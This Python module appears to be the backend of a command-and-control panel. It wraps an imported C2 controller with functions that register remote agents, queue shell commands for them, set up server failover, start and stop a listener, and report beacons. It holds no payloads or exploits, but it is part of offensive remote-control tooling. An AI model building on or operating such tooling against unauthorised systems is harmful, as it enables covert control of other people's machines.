"""C2 panel backend — thin sync wrapper over the v2 C2 controller."""
from __future__ import annotations

import asyncio
from typing import Any, Dict, List, Optional

_controller = None


def get_controller():
    global _controller
    if _controller is None:
        from ardf_v2_c2_infrastructure import C2Controller
        _controller = C2Controller()
    return _controller


def _run(coro):
    try:
        asyncio.get_running_loop()
        in_loop = True
    except RuntimeError:
        in_loop = False
    if in_loop:
        # Called from inside a running loop (async CLI): run the coroutine
        # in a fresh loop on a worker thread instead of failing.
        import threading
        box: Dict[str, Any] = {}

        def _target() -> None:
            try:
                box["v"] = asyncio.run(coro)
            except Exception as exc:  # noqa: BLE001
                box["e"] = exc

        t = threading.Thread(target=_target, daemon=True)
        t.start()
        t.join()
        if "e" in box:
            raise box["e"]
        return box.get("v")
    try:
        return asyncio.run(coro)
    except RuntimeError:  # already inside a loop (tests)
        loop = asyncio.new_event_loop()
        try:
            return loop.run_until_complete(coro)
        finally:
            loop.close()


def agents() -> List[Dict[str, Any]]:
    c = get_controller()
    try:
        status = c.get_agent_status()
        if isinstance(status, dict):
            # Wrapped forms first: {"agents": {...}} / {"items": [...]}
            for key in ("agents", "items"):
                v = status.get(key)
                if isinstance(v, dict):
                    return list(v.values())
                if isinstance(v, list):
                    return v
            # Bare mapping form: {agent_id: {info...}}
            if status and all(isinstance(v, dict) for v in status.values()):
                return [{"agent_id": aid, **info} for aid, info in status.items()]
            return []
        return list(status or [])
    except Exception:
        return [{"id": aid, **a.to_dict()} for aid, a in
                getattr(c, "agents", {}).items()]


def _publish(event_type: str, data: dict) -> None:
    try:
        from ops.events import publish
        publish(event_type, data)
    except Exception:
        pass


def register(agent_data: Dict[str, Any]) -> str:
    agent_id = str(_run(get_controller().register_agent(agent_data)))
    _publish("c2.agent.registered", {"agent_id": agent_id})
    return agent_id


def queue_task(agent_id: str, command: str,
               command_type: str = "shell") -> Dict[str, Any]:
    from ardf_v2_c2_infrastructure import C2CommandType
    ctype = getattr(C2CommandType, command_type.upper(), C2CommandType.SHELL) \
        if hasattr(C2CommandType, "SHELL") else command_type
    try:
        cid = _run(get_controller().queue_command(agent_id, ctype, command))
    except TypeError:
        cid = _run(get_controller().queue_command(agent_id, command))
    _publish("c2.agent.task",
             {"agent_id": agent_id, "command_id": str(cid),
              "type": command_type})
    return {"command_id": str(cid), "agent_id": agent_id}


def failover(primary: str, backup1: str, backup2: str) -> Dict[str, Any]:
    out = _run(get_controller().setup_failover(primary, backup1, backup2))
    _publish("c2.failover", {"primary": primary})
    return out


def listener_status() -> Dict[str, Any]:
    c = get_controller()
    listener = getattr(c, "listener", None)
    running = bool(listener and getattr(listener, "running", False))
    return {
        "running": running,
        "host": getattr(listener, "listen_host", None) if listener else None,
        "port": getattr(listener, "listen_port", None) if listener else None,
    }


def listener_start(host: str = "127.0.0.1", port: int = 4443) -> Dict[str, Any]:
    out = _run(get_controller().start_listener(host, int(port)))
    _publish("c2.listener.started", {"host": host, "port": int(port)})
    return out


def listener_stop() -> Dict[str, Any]:
    out = _run(get_controller().stop_listener())
    _publish("c2.listener.stopped", {})
    return out


def overview() -> Dict[str, Any]:
    c = get_controller()
    raw_beacons = getattr(c, "beacons", None) or {}
    if isinstance(raw_beacons, dict):
        beacons = [getattr(k, "value", str(k)) for k in raw_beacons.keys()]
    else:
        beacons = [b if isinstance(b, str) else str(getattr(b, "value", b))
                   for b in raw_beacons]
    fo = getattr(c, "failover_config", None)
    return {
        "agents": agents(),
        "beacons": beacons,
        "failover": fo if isinstance(fo, (dict, list, str, type(None))) else str(fo),
    }
